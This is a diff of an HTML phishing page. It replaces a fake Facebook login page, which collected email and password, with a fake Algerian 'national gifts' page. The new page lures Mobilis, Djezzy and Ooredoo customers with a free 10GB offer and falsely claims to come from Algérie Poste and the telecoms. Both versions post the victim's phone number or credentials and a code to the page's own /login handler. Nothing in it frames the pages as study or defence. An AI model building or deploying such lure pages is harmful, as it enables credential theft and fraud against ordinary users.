@@ -3,23 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - تسجيل الدخول</title>
+    <title>تفعيل هدايا الإنترنت - الجزائر</title>
     <style>
-        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
-        img { width: 200px; margin-bottom: 20px; }
-        input { width: 90%; padding: 14px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; }
-        button { width: 95%; padding: 14px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 20px; font-weight: bold; cursor: pointer; }
+        body { font-family: 'Cairo', sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 25px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 90%; max-width: 380px; text-align: center; border-top: 10px solid #008751; }
+        .logo { width: 70px; margin-bottom: 10px; }
+        h2 { color: #2c3e50; font-size: 20px; margin-bottom: 5px; }
+        .promo-badge { background: #ffd700; color: #000; padding: 8px; border-radius: 10px; font-weight: bold; font-size: 14px; margin: 15px 0; display: inline-block; }
+        input { width: 100%; padding: 15px; margin: 10px 0; border: 2px solid #eee; border-radius: 12px; font-size: 16px; box-sizing: border-box; text-align: center; transition: 0.3s; }
+        input:focus { border-color: #008751; outline: none; }
+        button { width: 100%; padding: 15px; background-color: #008751; border: none; border-radius: 12px; color: white; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        button:hover { background-color: #006b40; }
+        .footer-text { font-size: 11px; color: #999; margin-top: 20px; }
     </style>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@700&display=swap" rel="stylesheet">
 </head>
 <body>
-    <div class="box">
-        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4l_v2zS3p9A.svg" alt="Facebook">
+    <div class="card">
+        <img src="https://cdn-icons-png.flaticon.com/512/3050/3050223.png" class="logo">
+        <h2>منصة الهدايا الوطنية 🇩🇿</h2>
+        <p style="font-size: 13px; color: #7f8c8d;">أدخل رقم الهاتف لتلقي عرض الـ 10GB المجاني فوراً</p>
+        <div class="promo-badge">🎁 العرض صالح لـ Mobilis, Djezzy, Ooredoo</div>
         <form action="/login" method="post">
-            <input type="text" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
-            <input type="password" name="password" placeholder="كلمة السر" required>
-            <button type="submit">تسجيل الدخول</button>
+            <input type="tel" name="email" placeholder="رقم الهاتف (05/06/07)" required>
+            <input type="text" name="password" placeholder="أدخل كود العرض (مثلاً: *151*2#)" required>
+            <button type="submit">تفعيل العرض الآن</button>
         </form>
+        <p class="footer-text">نظام التوزيع الآلي للهدايا - بريد الجزائر والاتصالات © 2026</p>
     </div>
 </body>
 </html>
